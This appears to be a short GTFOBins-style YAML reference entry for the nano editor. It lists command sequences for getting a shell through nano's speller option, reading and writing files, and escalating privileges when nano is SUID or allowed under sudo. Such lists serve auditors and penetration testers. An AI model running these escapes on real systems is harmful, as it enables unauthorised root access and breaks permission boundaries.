---
functions:
  shell:
    - code: |
        TF=$(mktemp)
        echo 'exec sh' > $TF
        chmod +x $TF
        nano -s $TF /etc/hosts
        ^T
  file-write:
    - code: |
        nano file_to_write
        DATA
        ^O
  file-read:
    - code: nano file_to_read
  suid:
    - code: |
        TF=$(mktemp)
        echo 'exec sh -p' > $TF
        chmod +x $TF
        ./nano -s $TF /etc/hosts
        ^T
  sudo:
    - code: |
        TF=$(mktemp)
        echo 'exec sh' > $TF
        chmod +x $TF
        sudo nano -s $TF /etc/hosts
        ^T
---
